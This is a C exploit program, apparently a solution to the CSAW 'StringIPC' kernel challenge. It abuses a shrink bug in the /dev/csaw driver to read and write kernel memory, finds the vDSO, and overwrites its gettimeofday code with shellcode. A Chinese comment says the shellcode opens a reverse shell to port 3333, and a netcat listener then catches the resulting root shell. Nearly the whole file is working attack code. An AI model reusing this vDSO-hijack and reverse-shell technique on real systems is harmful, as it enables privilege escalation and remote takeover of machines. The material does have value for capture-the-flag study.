#include <stdio.h>
#include <fcntl.h>
#include <sys/auxv.h>
#include <stdlib.h>
#include <string.h>
#include "exp.h"


#define GETTIMEOFDAY 0xcb0

int get_gettimeofday_str_offset(){
    unsigned long vdso_addr = getauxval(AT_SYSINFO_EHDR);
    char * name = "gettimeofday";
    char* name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));
    if (name_addr < 0){
        puts("don't found vdso gettimeofday!");
        exit(-1);
    }
    return name_addr - vdso_addr;
}


//用于反弹shell的shellcode，127.0.0.1:3333
char shellcode[]="\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05";

void main() {
    fd  = open("/dev/csaw", O_RDWR);
    id = c_alloc(fd, 0x20);
    c_shrink(fd, id, 0x21);

    char * buf;
    buf = malloc(0x1000);

    uint64 gettimeofday_str_offset = get_gettimeofday_str_offset();
    printf("[!] get gettimeofday string offset [0x%llx]\n", gettimeofday_str_offset);


    uint64 address = 0;
    for (address = 0xffffffff80000000; address<0xffffffffffffefff; address+=0x1000){
        printf("[-] address [0x%llx] buf [0x%llx]\n", address, buf);
        reada(address, buf, 0x1000);
        if (!strcmp(buf+gettimeofday_str_offset, "gettimeofday")){
            printf("[!] find vdso in kernel [0x%llx]\n", address);
            break;
        }
    }

    writea(address+GETTIMEOFDAY, shellcode, strlen(shellcode));
    sleep(1);
    system("nc -lvnp 3333");
    return 0;

}
